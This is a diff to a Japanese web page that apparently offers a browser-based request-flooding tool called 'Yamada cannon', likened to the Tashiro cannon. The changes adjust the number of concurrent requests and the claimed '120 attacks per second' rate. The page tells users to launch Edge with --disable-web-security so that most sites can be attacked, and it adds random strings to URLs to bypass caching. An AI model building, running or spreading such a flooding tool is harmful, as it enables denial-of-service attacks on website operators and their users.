@@ -43,7 +43,7 @@
             }
 
             // リクエストを並行して送信
-            const requestCount = 20; // 同時に送信するリクエストの数
+            const requestCount = 10; // 同時に送信するリクエストの数
             for (let i = 0; i < requestCount; i++) {
                 sendRequest(); // 非同期リクエストを開始
             }
@@ -64,7 +64,7 @@
         }
     </script>
    
-    <p>一秒で128回攻撃できます</p>
+    <p>一秒で120回攻撃できます</p>
     <p>これもそのままではほとんどのサイトが攻撃できないので</p>
     <p>1. Windows(のマーク)キー+Rキーを同時押しする。</p>
     <p>2. cmdと入力して検索する。</p>
@@ -73,6 +73,8 @@
     "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir="C:\Windows\Temp" https://yamada.onrender.com/
     
 </pre>
+<h1>田代砲との違い</h1>
 <p>田代砲との違いとしてはURLにランダムな文字列を付加してアクセスする所です</p>
+<p>性能としては、山田砲の方が上です</p><a href="https://tasiro.onrender.com/">（この自作田代砲と比べると）</a>
 </body>
 </html>
